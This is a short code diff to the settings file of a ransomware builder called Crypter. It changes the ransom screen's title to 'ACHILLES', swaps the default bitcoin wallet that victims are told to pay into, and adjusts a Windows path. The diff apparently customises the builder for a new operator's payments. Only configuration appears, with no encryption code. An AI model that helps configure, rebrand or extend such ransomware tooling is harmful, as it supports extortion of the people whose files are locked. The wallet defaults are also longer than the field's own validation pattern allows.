@@ -181,10 +181,10 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label_object_name": "GuiTitleLabel",
             "input_object_name": "GuiTitleTextCtrl",
             "regex": re.compile("^.{0,20}$"),
-            "example": "CRYPTER",
+            "example": "ACHILLES",
             "input_requirement": "A Title to display in Crypter GUI",
             "validate": True,
-            "default": "CRYPTER",
+            "default": "ACHILLES",
             "config_area": "Ransomware Settings"
             }
     ),
@@ -207,12 +207,12 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label_object_name": "WalletAddressLabel",
             "input_object_name": "WalletAddressTextCtrl",
             "regex": re.compile("^([A-Za-z0-9]{26,35})?$"),
-            "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
+            "example": "bc1q8jtcdqrdglhutuh77ap9lpeh0gd5wjlvmetks5",
             "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
                                  " characters (26-35 characters in length",
             "config_area": "Ransomware Settings",
             "validate": True,
-            "default": "bc1q5mc345lx0factn6yj59quvqgulzfxtmf0azqgq"
+            "default": "bc1q8jtcdqrdglhutuh77ap9lpeh0gd5wjlvmetks5"
             }
     ),
     (
@@ -376,7 +376,7 @@ RUNTIME_CONFIG_ITEMS = [
     ]
 
 PACKAGE_DIR = os.path.dirname(__file__)
-RUNTIME_CONFIG_PATH = os.path.join("../CrypterBuilder", "Resources", "runtime.cfg")
+RUNTIME_CONFIG_PATH = os.path.join("..\CrypterBuilder", "Resources", "runtime.cfg")
 
 # ERRORS
 ERROR_INVALID_DATA = 13
